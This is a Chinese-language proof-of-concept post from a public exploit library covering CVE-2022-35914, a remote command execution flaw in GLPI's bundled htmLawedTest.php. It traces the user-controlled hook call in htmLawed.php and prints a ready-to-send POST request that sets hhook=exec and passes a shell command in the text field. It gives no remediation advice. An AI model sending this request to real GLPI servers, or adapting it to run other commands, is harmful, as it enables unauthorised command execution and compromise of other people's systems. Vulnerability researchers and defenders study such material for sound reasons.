#  GLPI htmLawedTest.php 远程命令执行漏洞 CVE-2022-35914   
原创 PeiQi文库  PeiQi文库   2022-10-05 13:23  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6RVV2e7Iz0yrD7avmj6jvTzZgiav6umOmHgsWv4Hvh3zhgl0qJvSQKfNNic9ZKCRO7SX82jQiaNSHcw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6RVV2e7Iz0yrD7avmj6jvTQWO33O5iaK0xEwKqKryoZlC9yoDQIKgrmFGSWNL9EQWibxFkEvmZXsSg/640?wx_fmt=png "")  
  
## 漏洞描述  
  
GLPI是一个用于IT资产管理的开源软件,用PHP编写,并在GPL许可下发布。 作为一种开源技术,任何人都可以运行,修改或开发代码。GLPI 10.0.2及之前版本存在安全漏洞，该漏洞源于PHP htmlawed 模块中 允许 PHP 代码注入  
## 漏洞影响  
  
GLPI  
## 漏洞复现  
  
登录页面  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4icJaRrvZgjyvkmJ3jjQou69j7FIMtNcMzFEKIjDdqeyKiaYou1sU4tnuic9lsvmXRavhSt6MoD5pSA/640?wx_fmt=png "")  
  
出现问题的文件为 htmLawedTest.php， 来源于第三方库 PHP Labware  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4icJaRrvZgjyvkmJ3jjQou6mNIIH3yWmY6Q8N5eH9BrO0KYExWvQpcJia0Vka7VVyt7suukCsYuoicg/640?wx_fmt=png "")  
```
https://www.bioinformatics.org/phplabware/internal_utilities/htmLawed/

```  
  
在 htmLawedTest.php 中接收参数并传入方法 htmLawed 中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4icJaRrvZgjyvkmJ3jjQou6g4iahTCtSjpaibUmaBGRGbACKicXjeTqCguoKQcSXwrfLnAKaMiagJ5ibibg/640?wx_fmt=png "")  
  
跟进文件 htmLawed.php![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4icJaRrvZgjyvkmJ3jjQou61DKmq5tI0j4ZqNXWVq9373m90Ize71FiarvFkKlCORZDUSibJVicre8Zg/640?wx_fmt=png "")  
  
```
if($C['hook']){$t = $C['hook']($t, $C, $S);}

```  
  
这里可以看到参数均为用户可控参数，当控制参数 hhook 为 exec 和 text 为执行的命令时就导致了命令执行漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4icJaRrvZgjyvkmJ3jjQou6R2feMfJaI1nF8oR6zq0ImjskgsjA2BibMKYAg3T5PPWbTngVUXnTfdQ/640?wx_fmt=png "")  
  
验证POC  
```
/vendor/htmlawed/htmlawed/htmLawedTest.php

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4icJaRrvZgjyvkmJ3jjQou65CgO43AiavMH4efOA9kRJWrGncjVaMNOC53IhSql0nGSGkYFXlIZicDg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4icJaRrvZgjyvkmJ3jjQou6kmvgqj7FENgXzS0Micxd6TZ4GSfB68IWvBzyL17LYbIHC7LF85cWFkw/640?wx_fmt=png "")  
  
访问页面获取到 sid 与 token 后再发送请求包  
```
POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
Host: 
Accept: */*Accept-Encoding: gzip, deflateContent-Length: 88Content-Type: application/x-www-form-urlencodedtoken=a79cf121bde57fe0e3cc0f247f77961a&text=id&hhook=exec&sid=h1c0vk004dvulal5nj8i6en44e
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4icJaRrvZgjyvkmJ3jjQou6ibeL59q00bEDgoLM2wIyweVgpgUKt9mPAQWoDINnbJaGHq1gn9d9xAg/640?wx_fmt=png "")  
  
  
## 关注公众号  
```
下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
想要加入交流群的师傅公众号点击交流群找WgpsecBot机器人拉你啦～

```  
  
  
## 支持作者  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6RVV2e7Iz0yrD7avmj6jvTcMBicTAqaLJky9ScIO4Rq2AI7GbNL471D07npjsanAH2s4iaZGM5L1tQ/640?wx_fmt=png "")  
## 关于文库  
```
在线文库: http://wiki.peiqi.tech
Github: https://github.com/PeiQi0/PeiQi-WIKI-Book 

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6RVV2e7Iz0yrD7avmj6jvTz2mGLTWwwLW7B9Mib5XibKCWricFR6KaodRqLHwia5uPJgyxoQt4zT6e0g/640?wx_fmt=png "")  
## 文库动态  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6RVV2e7Iz0yrD7avmj6jvTppcfY8pl1iccWCwZMKTicrWWNJXmq80LO41GSqTkLr2OUca9RycNiaEdA/640?wx_fmt=png "")  
  
  
